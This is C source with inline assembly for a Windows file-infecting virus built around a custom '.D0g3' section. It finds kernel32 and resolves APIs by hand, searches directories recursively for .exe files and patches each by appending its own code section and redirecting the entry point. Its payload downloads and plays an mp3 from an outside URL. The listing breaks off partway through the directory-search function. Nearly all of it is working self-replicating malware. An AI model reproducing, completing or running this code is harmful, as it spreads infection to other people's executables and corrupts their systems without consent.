#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include "head.h"

DWORD __stdcall f0_cmp(char* x, char* y, int len);
void __stdcall  f1_cpy(char* x, char* y, int len);
DWORD __stdcall f2_len(char* X);
void __stdcall  f3_GetKernelBase();
DWORD __stdcall f4_Align(DWORD dwSize, DWORD dwAlign);
DWORD __stdcall f5_patchPe(DWORD f_Name);
DWORD __stdcall f6_getD0g3Section();
DWORD __stdcall f7_CheckFIle(DWORD f_Name);
void __stdcall  f8_SearchFile2();
DWORD __stdcall f9_GetApi(DWORD mImageBase, char* funcName);
void __stdcall  f10_initApi();
void __stdcall  f11_freloc(DWORD* x, int len, DWORD dif);
void __stdcall  f12_music();
void __stdcall  f13_fcat(char* x, char* y);
DWORD __stdcall f14_str_find(char* x, char y);
void  __stdcall f15_FindExeFilesRecursive(char* directory, int* cnt);
#pragma code_seg(".D0g3") 
__declspec(allocate(".D0g3")) __declspec(selectany)  DWORD apiAddr[24] = { 0 };
__declspec(allocate(".D0g3")) __declspec(selectany)  int funcAddr[] =  //18
{
    //Ҫ�ض�λ�ĵĶ���14��
    f0_cmp,//0
    f1_cpy,//1
    f2_len,//2
    f3_GetKernelBase,//3
    f4_Align,//4
    f5_patchPe,//5
    f6_getD0g3Section,//6
    f7_CheckFIle,//7
    f8_SearchFile2,//8
    f9_GetApi,//9
    f10_initApi,//10
    f11_freloc,//11
    f12_music,//12
    f13_fcat,//13
    f14_str_find,//14
    f15_FindExeFilesRecursive,//15
    0,//16
    0,//dif 17
};

__declspec(allocate(".D0g3")) __declspec(selectany) char szkernel32[] = "kernel32.dll";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetProcAddress[] = "GetProcAddress";
__declspec(allocate(".D0g3")) __declspec(selectany) char szLoadLibraryA[] = "LoadLibraryA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szCreateFileA[] = "CreateFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szReadFile[] = "ReadFile";
__declspec(allocate(".D0g3")) __declspec(selectany) char szWriteFile[] = "WriteFile";
__declspec(allocate(".D0g3")) __declspec(selectany) char szSetFilePointer[] = "SetFilePointer";
__declspec(allocate(".D0g3")) __declspec(selectany) char szCloseHandle[] = "CloseHandle";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetFileSize[] = "GetFileSize";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGlobalAlloc[] = "GlobalAlloc";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGlobalFree[] = "GlobalFree";
__declspec(allocate(".D0g3")) __declspec(selectany) char szFindFirstFileA[] = "FindFirstFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szFindNextFileA[] = "FindNextFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szFindClose[] = "FindClose";
__declspec(allocate(".D0g3")) __declspec(selectany) char szDeleteFileA[] = "DeleteFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetModuleHandleA[] = "GetModuleHandleA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szFreelibiary[] = "FreeLibrary";
__declspec(allocate(".D0g3")) __declspec(selectany) char szSleep[] = "Sleep";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetCurrentDirectoryA[] = "GetCurrentDirectoryA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szUrlmon[] = "Urlmon.dll";
__declspec(allocate(".D0g3")) __declspec(selectany) char szWinmm[] = "Winmm.dll";
__declspec(allocate(".D0g3")) __declspec(selectany) char szURLDownloadToFileA[] = "URLDownloadToFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szmciSendStringA[] = "mciSendStringA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szURL[] = "https://redqx.github.io/room/mp3/rq2.mp3";
__declspec(allocate(".D0g3")) __declspec(selectany) char szDpath[] = "D:/rq.mp3";
__declspec(allocate(".D0g3")) __declspec(selectany) char szmp31[] = "open D:/rq.mp3 alias dqx ";
__declspec(allocate(".D0g3")) __declspec(selectany) char szmp32[] = "play dqx";//
__declspec(allocate(".D0g3")) __declspec(selectany) DWORD szAPIname[] = //29
{
    //Ҫ�ض�λ�ĵĶ���
    szkernel32,//0
    szGetProcAddress,//1
    szLoadLibraryA,//2
    szCreateFileA,//3
    szReadFile,//4
    szWriteFile,//5
    szSetFilePointer,//6
    szCloseHandle,//7
    szGetFileSize,//8
    szGlobalAlloc,//9
    szGlobalFree,//10
    szFindFirstFileA,//11
    szFindNextFileA,//12
    szFindClose,//13
    szGetModuleHandleA,//14
    szDeleteFileA,//15
    szFreelibiary,//16
    szSleep,//17
    szGetCurrentDirectoryA,//18

    //���ض���
    szUrlmon,//19
    szURLDownloadToFileA,//20

    //�������ֵĶ���
    szWinmm,//21
    szmciSendStringA,//22

    szURL,//23
    szDpath,//24
    szmp31,//25
    szmp32,//26

    //�ض����27��
    0,
    0,//dif
};
DWORD __stdcall f0_cmp(char* x, char* y, int len)
{
    int  i;
    for (i = 0; i < len; i++)
    {
        if (x[i] > y[i])
        {
            return 1;
        }
        else if (x[i] < y[i])
        {
            return -1;
        }
    }
    return 0;
}
void __stdcall  f1_cpy(char* x, char* y, int len)
{
    int i;
    for (i = 0; i < len; i++)
    {
        x[i] = y[i];
    }
    x[i] = 0;
}
DWORD __stdcall f2_len(char* X)
{
    int i = 0;
    while (1)
    {
        if (X[i])
        {
            i++;
        }
        else
        {
            break;
        }
    }
    return i;
}
void __stdcall  f3_GetKernelBase()
{
    DWORD* lp_apiAddr;

    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        //�ض�λlpfuncAddr;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    DWORD32 High_Page; // edi

    High_Page = lp_apiAddr[0] & 0xFFFF0000;
    while (1)
    {
        if (*(DWORD*)High_Page == 0x00905A4D && *(DWORD*)(*(DWORD*)(High_Page + 60) + High_Page) == 0x00004550)//Ѱ��PE��MZ��־
        {
            break;
        }
        High_Page -= 0x10000;
        if (High_Page < 0x70000000)//kernel32װ������0x70000000���ϵĵ�ַ
        {
            return;
        }
    }
    lp_apiAddr[0] = High_Page;
    return;
}
DWORD __stdcall f4_Align(DWORD dwSize, DWORD dwAlign)//���ݶ�������,ȥ������ʵ����
{
    int tmp1 = dwSize / dwAlign;
    int mod1 = dwSize % dwAlign;
    if (mod1)//�������
    {
        return (tmp1 + 1) * dwAlign;
    }
    else
    {
        return dwSize;
    }
}
DWORD __stdcall f5_patchPe(DWORD f_Name) //���ڼ����˵�ͬʱ,�Լ����Ѿ�����Ⱦ��,����ֱ�ӿ����ֽڵ�D0g3���������˵����ouiһ��������,Ȼ���ipָ�����ǵ�start
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        //�ض�λlpfuncAddr;
        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        //�ض�λlpfuncAddr;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    BYTE szNewFile[MAX_PATH];
    BYTE szBuffer[256];
    DWORD hFile, dwTemp, dwEntry, lpMemory, OldEntry;
    DWORD fTemp0, dwFileSize, pNewSec;
    IMAGE_DOS_HEADER* dos_header;
    IMAGE_NT_HEADERS* nt_header;
    IMAGE_SECTION_HEADER* lp_hsec_extend;
    IMAGE_SECTION_HEADER* lp_hsec_last;
    DWORD  dwtmp;
    int secCnt;
    char tagSec[8];
    tagSec[0] = '.';
    tagSec[1] = 'D';
    tagSec[2] = '0';
    tagSec[3] = 'g';
    tagSec[4] = '3';
    tagSec[5] = 0;

    DWORD dataD0g3 = ((tf6_getD0g3Section)lpfuncAddr[6])();
    DWORD lenD0g3 = *((DWORD*)dataD0g3);
    if (dataD0g3 == -1)
    {
        return 0;
    }
    ((tGlobalFree10)lp_apiAddr[10])(dataD0g3);

    hFile = ((tCreateFileA3)lp_apiAddr[3])(f_Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        goto Exit0;
    }
    dwFileSize = ((tGetFileSize8)lp_apiAddr[8])(hFile, NULL);
    if (dwFileSize == 0)
    {
        goto Exit1;
    }
    lpMemory = ((tGlobalAlloc9)(lp_apiAddr[9]))(GPTR, dwFileSize);
    if (lpMemory == 0)
    {
        goto Exit1;
    }
    ((tReadFile4)lp_apiAddr[4])(hFile, lpMemory, dwFileSize, &fTemp0, NULL);
    dos_header = lpMemory;
    nt_header = dos_header->e_lfanew + lpMemory;
    secCnt = nt_header->FileHeader.NumberOfSections;
    lp_hsec_last = (DWORD)nt_header + sizeof(IMAGE_NT_HEADERS) + (secCnt - 1) * sizeof(IMAGE_SECTION_HEADER);

    lp_hsec_extend = (DWORD)lp_hsec_last + sizeof(IMAGE_SECTION_HEADER);
    nt_header->FileHeader.NumberOfSections++;
    ((tf1_cpy)lpfuncAddr[1])(lp_hsec_extend->Name, tagSec, 5);
    lp_hsec_extend->PointerToRawData = lp_hsec_last->PointerToRawData + lp_hsec_last->SizeOfRawData;
    lp_hsec_extend->SizeOfRawData = ((tf4_Align)lpfuncAddr[4])(lenD0g3, nt_header->OptionalHeader.FileAlignment);//0x989��һ��Ԥ�賤��
    dwtmp = ((tf4_Align)lpfuncAddr[4])(lenD0g3, nt_header->OptionalHeader.SectionAlignment);
    nt_header->OptionalHeader.SizeOfCode += dwtmp;
    nt_header->OptionalHeader.SizeOfImage += dwtmp;
    lp_hsec_extend->Misc.VirtualSize = lenD0g3;
    lp_hsec_extend->VirtualAddress = lp_hsec_last->VirtualAddress + ((tf4_Align)lpfuncAddr[4])(lp_hsec_last->Misc.VirtualSize, nt_header->OptionalHeader.SectionAlignment);
    lp_hsec_extend->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;


    //���ݱ��˵�ep,Ȼ���޸�ep,��һ��RVA ,��������е�ʱ��,��Ҫ�����޸ĵ�
    lpfuncAddr[16] = nt_header->OptionalHeader.AddressOfEntryPoint; //һ����Ⱦ�ɹ�,��ô����[12]�ͼ�¼

    nt_header->OptionalHeader.AddressOfEntryPoint = lp_apiAddr[23] + lp_hsec_extend->VirtualAddress;

    pNewSec = ((tGlobalAlloc9)lp_apiAddr[9])(GPTR, lp_hsec_extend->SizeOfRawData);
    ((tSetFilePointer6)lp_apiAddr[6])(hFile, 0, NULL, FILE_BEGIN);
    ((tWriteFile5)lp_apiAddr[5])(hFile, lpMemory, lp_hsec_extend->PointerToRawData, &fTemp0, NULL);//��ǰ�Ķ���
    ((tSetFilePointer6)lp_apiAddr[6])(hFile, lp_hsec_extend->PointerToRawData, NULL, FILE_BEGIN);

    //����֮ǰ,��ð�oep�������

    //�������ʱ��,������Ҫ�ض�λ��λ,Ȼ����ճ�����Ǹ���

    dataD0g3 = ((tf6_getD0g3Section)lpfuncAddr[6])();
    dataD0g3 += 4;
    ((tWriteFile5)lp_apiAddr[5])(hFile, dataD0g3, lenD0g3, &fTemp0, NULL); // ���ӵĶ���
    ((tGlobalFree10)lp_apiAddr[10])(pNewSec);
    dataD0g3 -= 4;
    ((tGlobalFree10)lp_apiAddr[10])(dataD0g3);
    //��������һ���޸��ļ�ep�Ĳ���
    //�´�������Ҫȥ���ɵĴ���
Ret:
Exit2:
    ((tGlobalFree10)lp_apiAddr[10])(lpMemory);
Exit1:
    ((tCloseHandle7)lp_apiAddr[7])(hFile);
Exit0:
    return -1;
}
DWORD __stdcall f6_getD0g3Section()
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    DWORD* lpAPIname;
    char tagSec[8] = { 0 };
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;


        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;


        lea eax, szAPIname;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpAPIname;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    DWORD headpRet;
    IMAGE_DOS_HEADER* dos_header = ((tGetModuleHandleA14)lp_apiAddr[14])(0);
    IMAGE_NT_HEADERS* nt_header = (DWORD)dos_header + dos_header->e_lfanew;
    DWORD secCnt = nt_header->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* pMysec = (DWORD)nt_header + sizeof(IMAGE_NT_HEADERS);
    int i, secLen;
    char* lp;
    tagSec[0] = '.';
    tagSec[1] = 'D';
    tagSec[2] = '0';
    tagSec[3] = 'g';
    tagSec[4] = '3';
    for (i = 0; i < secCnt; i++)
    {
        if (!((tf0_cmp)lpfuncAddr[0])(pMysec->Name, tagSec, 5))
        {
            break;
        }
        pMysec = (DWORD)pMysec + sizeof(IMAGE_SECTION_HEADER);
    }
    if (i == secCnt)
    {
        return -1;//������
    }
    if (lp_apiAddr[23] > pMysec->VirtualAddress)//������һ������Ĳ�����
    {
        lp_apiAddr[23] = lp_apiAddr[23] - pMysec->VirtualAddress;//�Ȼ�ȡ��ַ
    }
    secLen = pMysec->SizeOfRawData;
    headpRet = ((tGlobalAlloc9)lp_apiAddr[9])(GPTR, secLen + 4);


    if (headpRet)
    {
        *((DWORD*)headpRet) = pMysec->SizeOfRawData;
        lp = headpRet + 4;

        for (i = 0; i < 18 - 2; i++) {
            lpfuncAddr[i] -= lpfuncAddr[17];
        }
        for (i = 0; i < 29 - 2; i++) {
            lpAPIname[i] -= lpAPIname[28];
        }
        for (i = 0; i < secLen; i++)
        {
            lp[i] = ((char*)pMysec->VirtualAddress + (DWORD)dos_header)[i];//���ڴ���,������VA
        }
        for (i = 0; i < 18 - 2; i++) {
            lpfuncAddr[i] += lpfuncAddr[17];
        }
        for (i = 0; i < 29 - 2; i++) {
            lpAPIname[i] += lpAPIname[28];
        }
        return  headpRet;
    }
    else
    {
        return -1;
    }

}
DWORD __stdcall f7_CheckFIle(DWORD f_Name)
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    char tagSec[8] = { 0 };
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    DWORD ret;
    DWORD hFile, hLen, temp, pSec, nSec;
    IMAGE_DOS_HEADER dos_header;
    IMAGE_NT_HEADERS nt_header;
    IMAGE_SECTION_HEADER* lp_hsec_last;
    IMAGE_SECTION_HEADER* lp_hsec_head;
    tagSec[0] = '.';
    tagSec[1] = 'D';
    tagSec[2] = '0';
    tagSec[3] = 'g';
    tagSec[4] = '3';

    hFile = ((tCreateFileA3)lp_apiAddr[3])(f_Name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        goto Exit1;
    }
    hLen = ((tGetFileSize8)lp_apiAddr[8])(hFile, &temp);
    ((tReadFile4)lp_apiAddr[4])(hFile, &dos_header, sizeof(IMAGE_DOS_HEADER), &temp, NULL);
    if (dos_header.e_magic != 0x5A4D)
    {
        goto Exit1;
    }
    ((tSetFilePointer6)lp_apiAddr[6])(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
    ((tReadFile4)lp_apiAddr[4])(hFile, &nt_header, sizeof(IMAGE_NT_HEADERS), &temp, NULL);
    if (nt_header.Signature != 0x4550 || nt_header.FileHeader.Machine != 0x014C)//����x86��
    {
        goto Exit1;
    }
    pSec = ((tGlobalAlloc9)lp_apiAddr[9])(GPTR, hLen);
    if (pSec == NULL)
    {
        goto Exit1;
    }
    ((tSetFilePointer6)lp_apiAddr[6])(hFile, 0, NULL, FILE_BEGIN);
    ((tReadFile4)lp_apiAddr[4])(hFile, pSec, hLen, &temp, NULL);


    nSec = nt_header.FileHeader.NumberOfSections;
    lp_hsec_head = pSec + sizeof(IMAGE_NT_HEADERS) + dos_header.e_lfanew;
    lp_hsec_last = (DWORD)lp_hsec_head + (nSec - 1) * (sizeof(IMAGE_SECTION_HEADER));//���ӽ���

    //��û�б�����
    //����stdio�����ĵ���
    if (!((tf0_cmp)lpfuncAddr[0])(lp_hsec_last->Name, tagSec, 4))//���һ������,�����Ǹ���һ����ȡ
    {
        ((tGlobalFree10)lp_apiAddr[10])(pSec);
        ((tCloseHandle7)lp_apiAddr[7])(hFile);
        goto Exit1;//����Ⱦ��
    }
    //û����Ⱦ,�ɲ�������׷��һ��������
    while (!lp_hsec_head->PointerToRawData)//Ϊ0,��ȥ��һ����
    {
        lp_hsec_head = (DWORD)lp_hsec_head + sizeof(IMAGE_SECTION_HEADER);
    }
    if (((DWORD)lp_hsec_last + 2 * sizeof(IMAGE_SECTION_HEADER) - pSec) > lp_hsec_head->PointerToRawData)//���ӽ����Ľ���λ�õ� > ��һ������
    {
        goto Exit1;
    }
    ((tGlobalFree10)lp_apiAddr[10])(pSec);
    ((tCloseHandle7)lp_apiAddr[7])(hFile);
    goto Exit2;

Exit2:
    ret = -1;
    goto  Exit0;
Exit1:
    ret = 0;
Exit0:
    return ret;
}
void __stdcall  f8_SearchFile2()
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }



    int i;
    int len;
    int cnt = 0;
    char currentDir[MAX_PATH];
    ((tGetCurrentDirectoryA18)lp_apiAddr[18])(MAX_PATH, currentDir);
    len = ((tf2_len)lpfuncAddr[2])(currentDir);

    for (i = len;; i--)//������һ��Ŀ¼
    {
        if (currentDir[i] == '\\' || i == 0)
        {
            currentDir[i] = 0;
            break;
        }
        currentDir[i] = 0;
    }
    ((tf15_FindExeFilesRecursive)lpfuncAddr[15])(currentDir, &cnt);//��ȥ�ݹ�Ѱ��һЩ����
}
DWORD __stdcall f9_GetApi(DWORD mImageBase, char* funcName)
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        //�ض�λlpfuncAddr;
        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        //�ض�λlpfuncAddr;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    PIMAGE_EXPORT_DIRECTORY lpExport_VA = 0;
    PIMAGE_DOS_HEADER lpDosheader = mImageBase;
    PIMAGE_NT_HEADERS32 lpNtheader_VA = lpDosheader->e_lfanew + mImageBase;
    DWORD32* AddressofName_VA;
    DWORD32* Addressoffunction_VA;
    WORD* AddressOfOrdinal_VA;
    int max = 0;
    int i; // ebx
    int len_fucname; // [esp+0h] [ebp-8h]

    len_fucname = ((tf2_len)lpfuncAddr[2])(funcName);

    //ע�ⶼҪ����Imagebase
    lpExport_VA = lpNtheader_VA->OptionalHeader.DataDirectory[0].VirtualAddress + mImageBase;
    AddressofName_VA = lpExport_VA->AddressOfNames + mImageBase;// ��ȡaddressofname
    AddressOfOrdinal_VA = lpExport_VA->AddressOfNameOrdinals + mImageBase;
    Addressoffunction_VA = lpExport_VA->AddressOfFunctions + mImageBase;
    max = lpExport_VA->NumberOfNames;
    i = 0;
    for (i = 0; i < max; i++)
    {
        if (!((tf0_cmp)lpfuncAddr[0])(funcName, AddressofName_VA[i] + mImageBase, len_fucname))//��AddressofName����ָ������ֶ���Ŀ�꺯�����бȽ�,Ȼ��ȥ�ҵ�
        {
            break;
        }
    }
    if (i == max)
    {
        return 0;
    }
    else
    {
        return  Addressoffunction_VA[AddressOfOrdinal_VA[i]] + mImageBase;//�ú�����Ӧ��AddressOfOrdinal�ĳ�Ա,
    }
}
void __stdcall  f10_initApi()
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    DWORD* lpszAPIname;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        lea eax, szAPIname;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpszAPIname;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    //lp_apiAddr[0]: kernel32 base
    lp_apiAddr[1] = ((tf9_GetApi)lpfuncAddr[9])(lp_apiAddr[0], lpszAPIname[1]);
    lp_apiAddr[2] = ((tf9_GetApi)lpfuncAddr[9])(lp_apiAddr[0], lpszAPIname[2]);
    lp_apiAddr[3] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[3]);
    lp_apiAddr[4] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[4]);
    lp_apiAddr[5] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[5]);
    lp_apiAddr[6] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[6]);
    lp_apiAddr[7] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[7]);
    lp_apiAddr[8] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[8]);
    lp_apiAddr[9] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[9]);
    lp_apiAddr[10] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[10]);
    lp_apiAddr[11] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[11]);
    lp_apiAddr[12] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[12]);
    lp_apiAddr[13] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[13]);
    lp_apiAddr[14] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[14]);
    lp_apiAddr[15] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[15]);
    lp_apiAddr[16] = ((tf9_GetApi)lpfuncAddr[9])(lp_apiAddr[0], lpszAPIname[16]);
    lp_apiAddr[17] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[17]);
    lp_apiAddr[18] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[18]);

    lp_apiAddr[19] = ((tLoadLibraryA2)lp_apiAddr[2])(lpszAPIname[19]);
    lp_apiAddr[20] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[19], lpszAPIname[20]);


    lp_apiAddr[21] = ((tLoadLibraryA2)lp_apiAddr[2])(lpszAPIname[21]);
    lp_apiAddr[22] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[21], lpszAPIname[22]);

    lp_apiAddr[23] = lpfuncAddr[10] + 350 - ((tGetModuleHandleA14)lp_apiAddr[14])(0);//��Ⱦ���µ�ep,һ��RVA
    return;
}
void __stdcall  f11_freloc(DWORD* x, int len, DWORD dif)
{
    int i;
    for (i = 0; i < len; i++)
    {
        x[i] += dif;//�ϵ�+���=�µ�
        //���=�µ�-�ϵ�
    }
    i++;
    x[i] = dif;
}
void __stdcall  f12_music()
{
    DWORD* lp_apiAddr;
    DWORD* lpAPIname;

    HMODULE urlmonLib;
    HMODULE winmmLib;
    HRESULT hr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        lea eax, szAPIname;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpAPIname;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }

    urlmonLib = lp_apiAddr[19];
    winmmLib = lp_apiAddr[21];
    if (urlmonLib && winmmLib)
    {

        if (lp_apiAddr[20] && lp_apiAddr[22])
        {
            hr = ((tURLDownloadToFileAFunc20)lp_apiAddr[20]) (0, lpAPIname[23], lpAPIname[24], 0, NULL);
            if (hr == S_OK)
            {
                ((tmciSendStringAFunc22)lp_apiAddr[22])(lpAPIname[25], 0, 0, 0);//�����ڵ�ǰĿ¼��Ҳ����д"open ./2.mp3"./�������ʡ��
                ((tmciSendStringAFunc22)lp_apiAddr[22])(lpAPIname[26], 0, 0, 0);
                ((tSleep17)lp_apiAddr[17])(35 * 1000);
            }
        }
        ((tFreeLibrary16)lp_apiAddr[16])(urlmonLib);
        ((tFreeLibrary16)lp_apiAddr[16])(winmmLib);
        ((tDeleteFileA15)lp_apiAddr[15])(lpAPIname[24]);
    }
    return;
}
void __stdcall  f13_fcat(char* x, char* y)
{
    int i;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }

    int lenx = ((tf2_len)lpfuncAddr[2])(x);
    int leny = ((tf2_len)lpfuncAddr[2])(y);
    for (i = 0; i < leny; i++)
    {
        x[lenx + i] = y[i];
    }
    x[lenx + i] = 0;
    return;
}
DWORD __stdcall f14_str_find(char* x, char y)//Ӧ�÷������һ�γ��ֵ�λ��
{
    int  i;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    int len = ((tf2_len)lpfuncAddr[2])(x);
    DWORD xx = 0;
    for (i = 0; i < len; i++)
    {
        if (x[i] == y)
        {
            xx = &x[i];
        }
    }
    if (xx)
    {
        return xx;
    }
    return 0;
}
void  __stdcall f15_FindExeFilesRecursive(char* directory, int* cnt)
{
    char searchPath[MAX_PATH];
    char subDirPath[MAX_PATH];
    char filePath[MAX_PATH];
    WIN32_FIND_DATAA fileInfo;
    HANDLE hFind;
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    char* extension;
    char exp1[8];
    exp1[0] = '.';
    exp1[1] = 'e';
    exp1[2] = 'x';
    exp1[3] = 'e';
    exp1[4] = 0;
    char exp2[8];
    exp2[0] = '\\';
    exp2[1] = '*';
    exp2[2] = '.';
    exp2[3] = '*';
    exp2[4] = 0;
    char exp3[8];
    exp3[0] = '.';
    exp3[1] = '.';
    exp3[2] = '\\';
    exp3[4] = 0;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    ((tf1_cpy)lpfuncAddr[1])(searchPath, directory, ((tf2_len)lpfuncAddr[2])(directory));
    ((tf13_fcat)lpfuncAddr[13])(searchPath, exp2);
    hFind = ((tFindFirstFileA11)lp_apiAddr[11])(searchPath, &fileInfo);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!(fileInfo.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))//������ļ�
            {
                // ����ļ���չ���Ƿ�Ϊexe
                extension = ((tf14_str_find)lpfuncAddr[14])(fileInfo.cFileName, '.');//Ѱ�ҵ��λ��
                if (extension != NULL && ((tf0_cmp)lpfuncAddr[0])(extension, exp1, ((tf2_len)lpfuncAddr[2])(extension)) == 0)
                {
                    if ((*cnt) > 3)//�����Ⱦ��������4,����ǰ����
                    {
                        ((tFindClose13)lp_apiAddr[13])(hFind);
                        return;//�����������������
                    }
                    ((tf1_cpy)lpfuncAddr[1])(filePath, directory, ((tf2_len)lpfuncAddr[2])(directory));
                    ((tf13_fcat)lpfuncAddr[13])(filePath, &exp3[2]);
                    ((tf13_fcat)lpfuncAddr[13])(filePath, fileInfo.cFileName);
